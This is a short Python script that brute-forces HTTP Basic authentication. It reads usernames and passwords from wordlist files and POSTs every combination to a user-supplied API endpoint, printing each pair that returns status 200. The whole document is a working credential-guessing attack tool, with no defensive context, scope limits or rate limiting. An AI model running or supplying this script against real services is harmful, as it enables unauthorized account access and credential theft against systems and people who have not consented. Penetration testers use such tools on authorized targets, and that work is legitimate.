import requests
from base64 import b64encode

passwordList = []
userList =[]

userdict = input("Enter path to user file: ")
pwdict = input("Enter path to pw file: ")
url = input("Enter API endpoint: ")

def createPassList(dict_file):
    with open(dict_file, 'r') as d:
        for line in d.readlines():
            password = line.strip('\n')
            passwordList.append(password)

def createUserList(dict_file):
    with open(dict_file, 'r') as d:
        for line in d.readlines():
            user = line.strip('\n')
            userList.append(user)

def tryBrute():
    for usr in userList:

        for pwd in passwordList:

            userAndPass = usr + ":" + pwd
            userAndPassEncode = b64encode(userAndPass.encode()).decode("ascii")
            authString = str('Basic %s' %  userAndPassEncode)
            headers = {
            'authorization': authString,
            'cache-control': "no-cache",
            }
            response = requests.request("POST", url, headers=headers)
            if response.status_code == 200:
                print(usr + ":" + pwd)
            print(response)

createUserList(userdict)
createPassList(pwdict)
tryBrute()
